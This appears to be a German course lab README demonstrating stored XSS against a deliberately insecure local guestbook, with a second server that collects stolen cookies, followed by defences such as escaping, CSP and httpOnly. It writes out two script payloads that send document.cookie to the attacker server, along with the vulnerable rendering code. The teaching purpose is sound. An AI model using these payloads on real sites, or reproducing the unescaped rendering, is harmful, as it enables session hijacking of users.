# Labor 8 – Verteilte Systeme: Cross-Site Scripting (XSS)

> **Hinweis:** Dieses Labor dient ausschliesslich zu Bildungszwecken im Rahmen der Lehrveranstaltung *Verteilte Systeme*. Die enthaltenen Schwachstellen sind absichtlich eingebaut und dürfen nur in dieser kontrollierten Laborumgebung verwendet werden.

---

## Inhalt

- [Was wurde gebaut?](#was-wurde-gebaut)
- [Verzeichnisstruktur](#verzeichnisstruktur)
- [Schnellstart](#schnellstart)
- [Technische Erklärung](#technische-erklärung)
- [Die XSS-Payloads](#die-xss-payloads)
- [Angriffs-Ablauf (Netzwerkdiagramm)](#angriffs-ablauf-netzwerkdiagramm)
- [Schritt-für-Schritt-Walkthrough](#schritt-für-schritt-walkthrough)
- [Schutzmaßnahmen](#schutzmaßnahmen)

---

## Was wurde gebaut?

Es wurden zwei Node.js/Express-Server erstellt, die gemeinsam einen klassischen **Stored-XSS-Angriff** mit anschließendem **Cookie-Diebstahl** demonstrieren:

| Server | Port | Rolle |
|---|---|---|
| `vulnerable-server` | 3000 | Opfer-Anwendung (absichtlich unsicheres Gästebuch) |
| `attacker-server` | 4000 | Angreifer-Infrastruktur (empfängt gestohlene Cookies) |

**Kernproblem:** Der verwundbare Server speichert Benutzereingaben unverändert in einem Array und gibt sie direkt als rohen HTML-String an den Browser zurück – ohne jegliche Sanitisierung oder Escaping. Dadurch kann ein Angreifer beliebiges JavaScript im Browser jedes Besuchers ausführen.

---

## Verzeichnisstruktur

```
XSS/
├── README.md                        (diese Datei)
├── demo.sh                          (automatisiertes Demo-Skript)
├── vulnerable-server/
│   ├── package.json
│   └── server.js                    (verwundbares Gästebuch, Port 3000)
└── attacker-server/
    ├── package.json
    ├── server.js                    (Angreifer-Server, Port 4000)
    └── stolen_cookies.txt           (wird zur Laufzeit angelegt)
```

---

## Schnellstart

```bash
# Im Verzeichnis XSS/
bash demo.sh
```

Das Skript:
1. Installiert npm-Abhängigkeiten beider Server
2. Startet beide Server im Hintergrund
3. Trägt zwei XSS-Payloads automatisch ins Gästebuch ein
4. Zeigt Schritt-für-Schritt-Anweisungen

Anschließend:

1. **Login:** `http://localhost:3000/login` aufrufen → setzt Session-Cookie
2. **Gästebuch ansehen:** `http://localhost:3000/` → XSS-Payload wird ausgeführt
3. **Gestohlene Cookies anzeigen:** `http://localhost:4000/`

---

## Technische Erklärung

### XSS-Typen

Es gibt drei klassische XSS-Varianten:

| Typ | Beschreibung |
|---|---|
| **Stored XSS** (persistent) | Payload wird in der Datenbank / im Speicher gespeichert und bei jedem Seitenaufruf ausgeliefert. *Dies ist der in diesem Labor demonstrierte Typ.* |
| **Reflected XSS** | Payload wird im HTTP-Request mitgesendet und sofort in der Antwort reflektiert (z. B. Suchparameter). |
| **DOM-Based XSS** | Angriff findet ausschliesslich im Browser-DOM statt, ohne dass der Payload den Server erreicht. |

### Warum ist der Server verwundbar?

In `vulnerable-server/server.js` werden Einträge so gerendert:

```javascript
// VULNERABLE – keine Sanitisierung!
entriesHtml += `<p>${entry.message}</p>`;
```

Wenn `entry.message` den Wert `<script>alert(1)</script>` enthält, liefert der Server wörtlich dieses HTML an den Browser. Der Browser parst das `<script>`-Tag und führt den darin enthaltenen Code aus.

Eine sichere Alternative würde alle HTML-Sonderzeichen ersetzen:

```javascript
// SICHER – Escaping der Sonderzeichen
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
entriesHtml += `<p>${escapeHtml(entry.message)}</p>`;
```

### Warum ist der Cookie lesbar?

In `vulnerable-server/server.js` wird der Cookie mit `httpOnly: false` gesetzt:

```javascript
res.cookie('session', 'user123-secret-token', {
  httpOnly: false,  // INTENTIONALLY INSECURE – JS kann document.cookie lesen
  sameSite: 'Lax',
});
```

Das Flag `httpOnly: true` würde JavaScript den Zugriff auf `document.cookie` vollständig verwehren – selbst bei erfolgreichem XSS wäre der Cookie dann nicht auslesbar.

---

## Die XSS-Payloads

### Payload 1 – document.location (Redirect)

```html
<script>document.location='http://localhost:4000/steal?cookie='+document.cookie</script>
```

**Wirkung:** Leitet den Browser des Opfers auf den Angreifer-Server um. Der Cookie-Wert ist im URL-Parameter `cookie` als Klartext sichtbar. Der Opfer-Browser verlässt die Seite – für den Nutzer sichtbar.

### Payload 2 – fetch mit Base64-Kodierung (stiller Angriff)

```html
<script>fetch('http://localhost:4000/steal?cookie='+btoa(document.cookie))</script>
```

**Wirkung:** Sendet einen stillen HTTP-Request im Hintergrund. Der Nutzer bemerkt nichts. `btoa()` kodiert den Cookie in Base64, um Sonderzeichen im URL zu vermeiden. Der Angreifer-Server dekodiert den Wert automatisch.

**Unterschied im Entdeckungsrisiko:**

| Payload | Opfer bemerkt Angriff? | Umleitung? |
|---|---|---|
| document.location | Ja (Seite wechselt) | Ja |
| fetch (stiller) | Nein | Nein |

---

## Angriffs-Ablauf (Netzwerkdiagramm)

```
PHASE 1 – Payload einschleusen
──────────────────────────────
  Angreifer                 Verwundbarer Server (Port 3000)
     │                               │
     │  POST /guestbook              │
     │  name=Angreifer               │
     │  message=<script>fetch(...)   │
     │──────────────────────────────>│
     │                               │
     │                    Speichert Payload
     │                    OHNE Sanitisierung
     │                    im Speicher (Array)
     │                               │

PHASE 2 – Opfer ruft die Seite auf
────────────────────────────────────
  Opfer-Browser             Verwundbarer Server (Port 3000)
     │                               │
     │  GET /                        │
     │──────────────────────────────>│
     │                               │
     │  HTTP 200 – HTML mit          │
     │  <script>fetch(...)           │
     │<─────────────────────────────-│
     │                               │
     │  Browser parst HTML und
     │  führt <script>-Block aus

PHASE 3 – Cookie-Diebstahl
────────────────────────────────────
  Opfer-Browser             Angreifer-Server (Port 4000)
     │                               │
     │  GET /steal?cookie=           │
     │  dXNlcjEyMy1zZWNyZXQtdG9rZW4 │   (Base64: user123-secret-token)
     │──────────────────────────────>│
     │                               │
     │                    Loggt Cookie in
     │                    stolen_cookies.txt
     │                    + Konsolenausgabe
     │                               │
     │  200 OK (1x1 GIF)             │
     │<──────────────────────────────│

PHASE 4 – Angreifer wertet aus
────────────────────────────────────
  Angreifer                 Angreifer-Server (Port 4000)
     │                               │
     │  GET /                        │
     │──────────────────────────────>│
     │                               │
     │  Dashboard mit gestohlenen    │
     │  Cookies (inkl. Timestamps,   │
     │  IP-Adressen, Klartext)       │
     │<──────────────────────────────│
```

---

## Schritt-für-Schritt-Walkthrough

### Schritt 1 – Umgebung starten

```bash
cd /Users/janikschwarzenberger/Desktop/XSS
bash demo.sh
```

### Schritt 2 – Session-Cookie setzen

Browser öffnen: `http://localhost:3000/login`

Der Server setzt den Cookie:
```
Set-Cookie: session=user123-secret-token; SameSite=Lax
```
Da `httpOnly` **nicht** gesetzt ist, kann JavaScript diesen Cookie über `document.cookie` lesen.

### Schritt 3 – Gästebuch aufrufen (Payload wird ausgeführt)

Browser navigiert zu: `http://localhost:3000/`

Der Server liefert das HTML mit dem gespeicherten Payload:
```html
<p><script>fetch('http://localhost:4000/steal?cookie='+btoa(document.cookie))</script></p>
```

Der Browser führt das Script aus. `document.cookie` enthält:
```
session=user123-secret-token
```

`btoa('session=user123-secret-token')` ergibt:
```
c2Vzc2lvbj11c2VyMTIzLXNlY3JldC10b2tlbg==
```

### Schritt 4 – Angreifer-Server empfängt den Cookie

Der Request landet auf Port 4000:
```
GET /steal?cookie=c2Vzc2lvbj11c2VyMTIzLXNlY3JldC10b2tlbg== HTTP/1.1
Host: localhost:4000
```

Konsolenausgabe des Angreifer-Servers:
```
[ANGREIFER] *** COOKIE GESTOHLEN ***
[09.04.2026, 14:23:01] IP: ::1
  Raw:     c2Vzc2lvbj11c2VyMTIzLXNlY3JldC10b2tlbg==
  Decoded: session=user123-secret-token
```

### Schritt 5 – Dashboard anzeigen

Browser öffnen: `http://localhost:4000/`

Das Dashboard zeigt alle gestohlenen Cookies mit Zeitstempel und IP-Adresse. Die Seite aktualisiert sich automatisch alle 5 Sekunden.

---

## Schutzmaßnahmen

| Maßnahme | Schutz gegen |
|---|---|
| **HTML-Escaping** aller Nutzereingaben | Stored & Reflected XSS |
| **Content Security Policy (CSP)** im HTTP-Header | Ausführung von Inline-Scripts |
| **httpOnly-Flag** für Session-Cookies | Cookie-Diebstahl via XSS |
| **Input-Validierung** (serverseitig) | Einschleusung von Payloads |
| **Output-Encoding** (kontextabhängig) | XSS in HTML, JS, CSS, URL |
| **SameSite=Strict** für Cookies | CSRF + teilweise XSS-Szenarien |

### Beispiel: CSP-Header (Express)

```javascript
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'"
  );
  next();
});
```

Mit diesem Header würde der Browser das Inline-`<script>`-Tag aus dem Gästebuch-Eintrag **nicht ausführen**, da es nicht von der eigenen Domain stammt und keine Nonce vorhanden ist.

---

*Erstellt für Labor 8 – Verteilte Systeme | Nur für Bildungszwecke*
